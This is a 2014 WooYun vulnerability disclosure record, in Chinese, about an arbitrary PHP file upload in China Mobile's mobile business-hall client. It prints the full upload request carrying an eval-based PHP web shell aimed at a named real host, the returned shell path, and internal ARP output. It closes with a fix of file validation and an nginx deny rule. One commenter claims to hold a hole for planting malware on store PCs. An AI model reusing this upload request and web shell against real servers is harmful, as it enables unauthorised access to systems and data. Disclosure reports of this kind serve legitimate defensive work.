{"id": 5003, "wybug_id": "wooyun-2014-051605", "wybug_title": "中国移动手机营业厅GetShell可获取（内网）服务器权限", "wybug_corp": "中国移动", "wybug_author": "loli", "wybug_date": "2014-02-21 15:05", "wybug_open_date": "2014-04-07 15:06", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向公众公开  简要描述： 从前有个厂商，后来它不见了。。。 详细说明：  1.在10086官网上下载了个手机营业厅的Android客户端\nhttp://www.10086.cn/cmccclient/andriod.html\n\n\n2.客户端意见反馈处可上传图片，通过抓包进行提交发现可直接上传php脚本，服务端未进行任何过滤。POST请求：\nPOST /file.php HTTP/1.1Content-Length: 244Content-Type: multipart/form-data;Host: clientdispatch.10086.cn:8080Connection: closedAccept-Encoding: gzip--gHEBq3WtzAIOKRkmR5dzbKl7y-QvYjContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"Content-Type: application/octet-streamContent-Transfer-Encoding: binary<?php @eval($_POST['xxxx']);?>--gHEBq3WtzAIOKRkmR5dzbKl7y-QvYj--\n返回响应包：\nHTTP/1.1 200 OKServer: nginx/1.4.4Content-Type: text/htmlContent-Length: 84X-Powered-By: PHP/5.5.4Connection: Keep-aliveKeep-Alive: timeout=15, max=100Via: 1.1 ID-0001242737364450 uproxy-3200|http://clientdispatch.10086.cn:8080/upload/bc10ba96f9cxxxxxxxx951.php\n3.获取到webshell，并且是内网.\n[/]$ arpAddress                  HWtype  HWaddress           Flags Mask            Iface10.248.13.54             ether   00:15:17:4e:25:da   C                     bond010.248.13.35             ether   00:00:0c:07:ac:01   C                     bond010.248.13.50             ether   e4:1f:13:80:a2:37   C                     bond010.248.13.48             ether   e4:1f:13:80:a5:c7   C                     bond010.248.13.43             ether   e4:1f:13:80:a9:d5   C                     bond010.248.13.45             ether   e4:1f:13:80:a9:2d   C                     bond010.248.13.55             ether   00:15:17:4e:24:7e   C                     bond010.248.13.49             ether   e4:1f:13:80:a7:35   C                     bond010.248.13.47             ether   e4:1f:13:80:a2:c7   C                     bond0\n   漏洞证明：  \n\n   修复方案：  1.判断图片格式及完整性2.限制upload目录执行php脚本程序nginx.conf server处添加：location ~ /upload/.*.(php|php5)?$ {deny all;}   版权声明：转载请注明来源 loli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-02-26 06:37 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-21 15:24 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  他就叫移动吗···    \n     2014-02-21 15:38 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  因为什么不见了？因为移动了……我太TM机智了~    \n     2014-02-21 16:14 |    \t\tdiguoji \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:79        | 中国吉林长春)\t\t \n  我喜欢这个类型的站，支持洞主    \n     2014-02-21 17:09 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  手里有向营业厅电脑挂马的洞，不知道该不该提交呢..     \n     2014-02-21 17:10 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  因为什么不见了？因为移动了……我太TM机智了~    \n     2014-02-21 17:50 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  因为什么不见了？因为移动了……我太TM机智了~    \n     2014-04-07 15:27 |    \t\tl0u1s \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:3        | 崇尚自由、开放、共享、简约。)\t\t \n  因为什么不见了？因为移动了……我太TM机智了~    \n     2014-04-08 02:52 |    \t\t小火苗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 我是一只小火苗呀，春风吹又生呀...)\t\t \n  因为什么不见了？因为移动了……我太TM机智了~    \n     2014-04-08 08:15 |    \t\tLeadUrLife \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:14        | 好好学习 天天向上)\t\t \n  @MeirLin 是那个插件溢出嘛?    \n     2014-04-08 22:19 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  因为什么不见了？因为移动了……我太TM机智了~     \n     2014-04-09 10:39 |    \t\tplane636 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:16        )\t\t \n  因为什么不见了？因为移动了……我太TM机智了~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}